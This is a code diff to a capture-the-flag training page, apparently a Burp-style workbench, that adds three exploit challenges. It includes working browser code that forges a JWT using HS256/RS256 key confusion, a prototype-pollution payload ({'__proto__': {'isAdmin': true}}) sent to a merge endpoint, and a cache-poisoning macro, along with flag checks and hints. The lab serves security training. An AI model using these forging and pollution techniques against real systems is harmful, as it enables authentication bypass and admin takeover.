@@ -112,7 +112,7 @@
 <body>
   <main>
     <div class="training">
-      Tier 4 // Burp-Style Workbench · <a href="lab.html">lab</a> · <a href="CHALLENGE.md">brief</a> · <a href="sw-ctf.js">sw-ctf.js</a>
+      Tier 4 // Burp-Style Workbench · <a href="lab.html">lab</a> · <a href="challenge.html">brief</a> · <a href="sw-ctf.js">sw-ctf.js</a>
     </div>
     <div class="status-strip" aria-hidden="true">
       <span>DEFCON_CTF::<span class="s-warn">4</span></span>
@@ -149,6 +149,8 @@
           <button data-add="Content-Type: application/json">+ Content-Type JSON</button>
           <button id="quick-jwt" type="button">+ JWT from localStorage</button>
           <button id="quick-jwt-none" type="button">+ Forge alg=none JWT (role=admin)</button>
+          <button id="quick-jwt-hsrs" type="button">+ Forge HS/RS-confused JWT (F31)</button>
+          <button id="quick-proto" type="button">prepare proto-pollution body (F32)</button>
         </div>
         <label class="note">Headers (one per line, "Name: Value")</label>
         <textarea id="headers" spellcheck="false"></textarea>
@@ -162,18 +164,20 @@
         </div>
 
         <div class="toolbar">
-          <button id="race" class="primary" type="button">Race 6x POST /redeem</button>
-          <button id="enum" type="button">Enumerate /profile uid 1..50</button>
+          <button id="race"  class="primary" type="button">Race 6x POST /redeem (F29)</button>
+          <button id="enum"  type="button">Enumerate /profile uid 1..50</button>
+          <button id="proto" type="button">Pollute proto + open /admin/console (F32)</button>
+          <button id="poison" type="button">Poison cache + GET /admin/cached-users (F33)</button>
           <button id="reset" type="button">Reset solved</button>
         </div>
       </section>
 
       <!-- RIGHT: F21-F30 checklist -->
       <section class="panel">
-        <h2>Findings F21 - F30</h2>
+        <h2>Findings F21 - F33</h2>
         <p class="note">Some auto-confirm when the right exploit response is observed; others want an answer in the input box.</p>
         <ul class="findings" id="findings"></ul>
-        <div class="progress" id="progress">0/10 confirmed</div>
+        <div class="progress" id="progress">0/13 confirmed</div>
       </section>
     </div>
 
@@ -186,7 +190,7 @@
       <a href="console.html">Console (Tier 1)</a>
       <a href="crypto.html">Crypto (Tier 2)</a>
       <a href="intel.html">Intel (Tier 3)</a>
-      <a href="CHALLENGE.md">Brief</a>
+      <a href="challenge.html">Brief</a>
     </div>
   </main>
 
@@ -210,6 +214,12 @@
       { v: "GET",  u: "api/v1/debug?secret=admin",          d: "decoy bait endpoint", decoy: true },
       { v: "GET",  u: "api/v1/lab/sysinfo",                 d: "decoy fingerprint (no real server)", decoy: true },
       { v: "GET",  u: "api/v1/__proto__/polluted",          d: "decoy proto-pollution probe", decoy: true },
+      { v: "GET",  u: "api/v1/auth/keys.pub",               d: "RSA public PEM (Tier 5; key-confusion target)" },
+      { v: "GET",  u: "api/v1/internal/super",              d: "Tier 5: HS256 with PEM bytes as HMAC key (F31)" },
+      { v: "POST", u: "api/v1/config/merge",                d: "Tier 5: vulnerable deep-merge (F32)" },
+      { v: "GET",  u: "api/v1/admin/console",               d: "Tier 5: opens after prototype pollution (F32)" },
+      { v: "POST", u: "api/v1/cache/put?key=admin/users",   d: "Tier 5: unauthenticated cache write (F33)" },
+      { v: "GET",  u: "api/v1/admin/cached-users",          d: "Tier 5: reads cache before auth (F33)" },
       { v: "GET",  u: "admin",                              d: "hidden admin landing (SW-served)" },
       { v: "GET",  u: ".env.bak",                           d: "decoy .env backup", decoy: true },
       { v: "GET",  u: ".git/HEAD",                          d: "decoy git head", decoy: true },
@@ -261,6 +271,19 @@
         hint: "auto: combine the alg=none JWT (admin role) plus header X-Cw-Ops: cyberworld-operator",
         mode: "auto", autoCheck: ({path, body}) => path === "api/v1/internal/flag" && /CTF_FLAG\{F30_/.test(body),
         token: "cyberworld:F30:chain:jwt+xcwops" },
+      // Tier 5 -- deeper chain
+      { n: 31, title: "JWT key confusion: HS256 signed with RSA public PEM -> /api/v1/internal/super",
+        hint: "auto: GET /api/v1/auth/keys.pub, then mint HS256 with the PEM bytes as key; need claim superadmin:true",
+        mode: "auto", autoCheck: ({path, body}) => path === "api/v1/internal/super" && /CTF_FLAG\{F31_/.test(body),
+        token: "cyberworld:F31:jwt:hs256-rs256-key-confusion" },
+      { n: 32, title: "Prototype pollution via /api/v1/config/merge unlocks /api/v1/admin/console",
+        hint: "auto: POST a JSON body that pollutes Object.prototype.isAdmin and .maintenance, then GET /admin/console",
+        mode: "auto", autoCheck: ({path, body}) => path === "api/v1/admin/console" && /CTF_FLAG\{F32_/.test(body),
+        token: "cyberworld:F32:proto-pollution:admin-console" },
+      { n: 33, title: "SW cache poisoning: GET /api/v1/admin/cached-users after poisoning the cache",
+        hint: "auto: POST anything to /api/v1/cache/put?key=admin/users, then GET cached-users",
+        mode: "auto", autoCheck: ({path, body}) => path === "api/v1/admin/cached-users" && /CTF_FLAG\{F33_/.test(body),
+        token: "cyberworld:F33:sw-cache:poisoning:pre-auth-read" },
     ];
 
     // ----------------- helpers -----------------
@@ -307,6 +330,33 @@
       const pl  = b64url(enc.encode(JSON.stringify({ sub: "forged-operator", role: "admin", iat: now, exp: now + 3600 })));
       const jwt = hdr + "." + pl + ".";
       hdrsEl.value = (hdrsEl.value ? hdrsEl.value + "\n" : "") + "Authorization: Bearer " + jwt;
+    });
+
+    // F31 -- forge HS256 signed with the RSA public PEM bytes (key confusion).
+    document.getElementById("quick-jwt-hsrs").addEventListener("click", async () => {
+      const stateLine = document.getElementById("stateLine");
+      try {
+        const r = await fetch("api/v1/auth/keys.pub", { cache: "no-store" });
+        const pem = await r.text();
+        const now = Math.floor(Date.now()/1000);
+        const hdr = b64url(enc.encode(JSON.stringify({ alg: "HS256", typ: "JWT" })));
+        const pl  = b64url(enc.encode(JSON.stringify({ sub: "forged-super", role: "admin", superadmin: true, iat: now, exp: now + 3600 })));
+        const k   = await crypto.subtle.importKey("raw", enc.encode(pem), { name: "HMAC", hash: "SHA-256" }, false, ["sign"]);
+        const sig = b64url(new Uint8Array(await crypto.subtle.sign("HMAC", k, enc.encode(hdr + "." + pl))));
+        const jwt = hdr + "." + pl + "." + sig;
+        hdrsEl.value = (hdrsEl.value ? hdrsEl.value + "\n" : "") + "Authorization: Bearer " + jwt;
+        document.getElementById("url").value = "api/v1/internal/super";
+        document.getElementById("method").value = "GET";
+      } catch (e) { stateLine.textContent = "HS/RS forge failed: " + e.message; }
+    });
+
+    // F32 -- preload a proto-pollution JSON body
+    document.getElementById("quick-proto").addEventListener("click", () => {
+      document.getElementById("method").value = "POST";
+      document.getElementById("url").value = "api/v1/config/merge";
+      document.getElementById("body").value =
+        JSON.stringify({ "__proto__": { "isAdmin": true, "maintenance": false } });
+      hdrsEl.value = (hdrsEl.value ? hdrsEl.value + "\n" : "") + "Content-Type: application/json";
     });
 
     // ----------------- UI: send -----------------
@@ -403,6 +453,64 @@
       renderFindings();
     });
 
+    // F32 macro: pollute + open admin/console in one click
+    document.getElementById("proto").addEventListener("click", async () => {
+      try {
+        await fetch("api/v1/config/merge", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ "__proto__": { "isAdmin": true, "maintenance": false } }),
+          cache: "no-store",
+        });
+        document.getElementById("method").value = "GET";
+        document.getElementById("url").value = "api/v1/admin/console";
+        await send({ method: "GET", url: "api/v1/admin/console", headers: "", body: "" });
+      } catch (e) {
+        document.getElementById("r-body").textContent = "proto macro failed: " + e.message;
+      }
+    });
+
+    // F33 macro: poison cache then GET cached-users
+    document.getElementById("poison").addEventListener("click", async () => {
+      try {
+        await fetch("api/v1/cache/put?key=admin/users", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ poisoned: true, attacker: "trainee", note: "this came from the cache, not auth" }),
+          cache: "no-store",
+        });
+        document.getElementById("method").value = "GET";
+        document.getElementById("url").value = "api/v1/admin/cached-users";
+        await send({ method: "GET", url: "api/v1/admin/cached-users", headers: "", body: "" });
+      } catch (e) {
+        document.getElementById("r-body").textContent = "poison macro failed: " + e.message;
+      }
+    });
+
+    // ----- on-demand hint loader (hints live in /hints.json) -----
+    let _hintsCache = null;
+    async function getHints() {
+      if (_hintsCache) return _hintsCache;
+      const r = await fetch("hints.json", { cache: "no-store" });
+      if (!r.ok) throw new Error("hints.json " + r.status);
+      _hintsCache = await r.json();
+      return _hintsCache;
+    }
+    document.addEventListener("click", async (ev) => {
+      const btn = ev.target.closest(".finding button.hint-btn");
+      if (!btn) return;
+      const n = Number(btn.dataset.n);
+      const out = btn.closest(".finding").querySelector(".res");
+      try {
+        const h = await getHints();
+        const tip = (h.hints && h.hints[String(n)]) || "no hint available";
+        out.className = "res"; out.style.color = "var(--warn)";
+        out.textContent = "hint: " + tip;
+      } catch (e) {
+        out.className = "res bad"; out.textContent = "hint load failed: " + e.message;
+      }
+    });
+
     // ----------------- UI: findings panel -----------------
     const findEl = document.getElementById("findings");
     function renderFindings() {
@@ -415,7 +523,8 @@
         if (isOk) { li.className = "ok"; okCount += 1; }
         li.innerHTML =
           '<span class="n">F' + f.n + '</span>' + escapeHtml(f.title) +
-          '<span class="hint">hint: ' + escapeHtml(f.hint) + '</span>';
+          ' <button class="hint-btn" data-n="' + f.n + '" type="button" style="font-size:.55rem;padding:2px 6px;margin-left:6px;border:1px solid rgba(255,191,0,.4);background:transparent;color:var(--warn);border-radius:3px;cursor:pointer">hint</button>' +
+          '<span class="hint">' + (f.mode === "auto" ? "(auto-confirms on exploit)" : "(type observation below)") + '</span>';
         if (f.mode === "text" && !isOk) {
           const input = document.createElement("div");
           input.className = "input";
